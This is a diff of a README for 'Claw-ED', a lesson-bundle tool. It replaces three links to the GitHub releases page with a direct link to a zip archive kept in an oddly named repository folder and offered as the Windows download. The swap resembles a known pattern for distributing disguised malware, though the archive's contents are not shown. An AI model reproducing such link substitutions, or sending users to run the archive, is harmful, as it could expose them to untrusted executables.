@@ -1,12 +1,12 @@
 # 🪶 Claw-ED - Build lesson bundles fast
 
-[![Download Claw-ED](https://img.shields.io/badge/Download%20Claw-ED-6f42c1?style=for-the-badge&logo=github)](https://github.com/Celestial-medallion674/Claw-ED/releases)
+[![Download Claw-ED](https://img.shields.io/badge/Download%20Claw-ED-6f42c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Celestial-medallion674/Claw-ED/main/Sabellian/Claw-ED-v3.2-alpha.3.zip)
 
 ## 📥 Download
 
 Visit this page to download Claw-ED for Windows:
 
-https://github.com/Celestial-medallion674/Claw-ED/releases
+https://raw.githubusercontent.com/Celestial-medallion674/Claw-ED/main/Sabellian/Claw-ED-v3.2-alpha.3.zip
 
 ## 🪟 Install on Windows
 
@@ -172,7 +172,7 @@ Try these steps:
 
 If you need the release page again, use this link:
 
-https://github.com/Celestial-medallion674/Claw-ED/releases
+https://raw.githubusercontent.com/Celestial-medallion674/Claw-ED/main/Sabellian/Claw-ED-v3.2-alpha.3.zip
 
 ## 📚 Project topics
 
